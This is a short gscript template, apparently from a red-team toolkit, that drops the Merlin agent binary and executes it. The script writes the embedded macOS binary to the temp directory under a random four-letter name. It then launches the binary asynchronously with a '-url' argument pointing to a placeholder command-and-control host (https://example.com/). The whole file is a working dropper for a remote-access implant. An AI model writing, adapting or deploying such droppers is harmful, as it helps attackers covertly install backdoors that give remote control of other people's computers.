// Example gscript template
// Title: Merlin Example
// Author: ahhh
// Purpose: Drops merlin as an asset and executes it async
// Gscript version: 1.0.0
// ATT&CK: 

//priority:150
//timeout:150

//go_import:os as os

//import:/private/tmp/merlinagent.macho


function Deploy() {  
    console.log("Starting to drop merlin binary");
    
    // Getting our asset
    var merlinBin = GetAssetAsBytes("merlinagent.macho");
    if (merlinBin[1] != null) {
        console.log("errors: "+merlinBin[1].Error());
    }

    // Getting a random path
    var temppath = os.TempDir();
    var naming = G.rand.GetAlphaString(4);
    naming = temppath + "/" + naming.toLowerCase();
    console.log("file name: "+ naming);

    // Write payload
    var errors = G.file.WriteFileFromBytes(naming, merlinBin[0]);
    if (errors != null) {
        console.log("errors: "+errors.Error());
    }

    // Run payload
    var running = G.exec.ExecuteCommandAsync(naming, ["-url", "https://example.com/"]);
    if (running[1] != null) {
        console.log("errors: "+running[1].Error());
    } else {
        console.log("pid: "+running[0].Process.Pid);
    }

    return true
}